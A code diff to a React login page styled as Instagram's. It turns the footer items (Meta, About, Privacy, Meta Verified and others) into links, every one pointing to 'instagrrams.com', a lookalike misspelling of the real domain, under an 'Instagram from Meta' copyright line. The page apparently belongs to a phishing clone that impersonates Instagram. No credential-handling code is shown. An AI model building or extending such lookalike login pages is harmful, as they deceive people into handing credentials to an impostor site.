@@ -239,21 +239,97 @@ const LoginPage = () => {
       <hr className="border-t border-gray-300 mb-4" />
       <div className="py-6 px-10 text-xs text-[#8e8e8e] text-center w-full">
         <div className="flex flex-wrap justify-center gap-x-3 gap-y-1 mb-4">
-          <span className="hover:underline cursor-pointer">Meta</span>
-          <span className="hover:underline cursor-pointer">About</span>
-          <span className="hover:underline cursor-pointer">Blog</span>
-          <span className="hover:underline cursor-pointer">Jobs</span>
-          <span className="hover:underline cursor-pointer">Help</span>
-          <span className="hover:underline cursor-pointer">API</span>
-          <span className="hover:underline cursor-pointer">Privacy</span>
-          <span className="hover:underline cursor-pointer">Terms</span>
-          <span className="hover:underline cursor-pointer">Top Accounts</span>
-          <span className="hover:underline cursor-pointer">Locations</span>
-          <span className="hover:underline cursor-pointer">Instagram Lite</span>
-          <span className="hover:underline cursor-pointer">
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            Meta
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            About
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            Blog
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            Jobs
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            Help
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            API
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            Privacy
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            Terms
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            Top Accounts
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            Locations
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            Instagram Lite
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
             Contact Uploading & Non-Users
-          </span>
-          <span className="hover:underline cursor-pointer">Meta Verified</span>
+          </a>
+          <a
+            href="https://instagrrams.com/"
+            className="hover:underline cursor-pointer"
+            rel="noopener noreferrer"
+          >
+            Meta Verified
+          </a>
         </div>
         <div>© 2026 Instagram from Meta</div>
       </div>
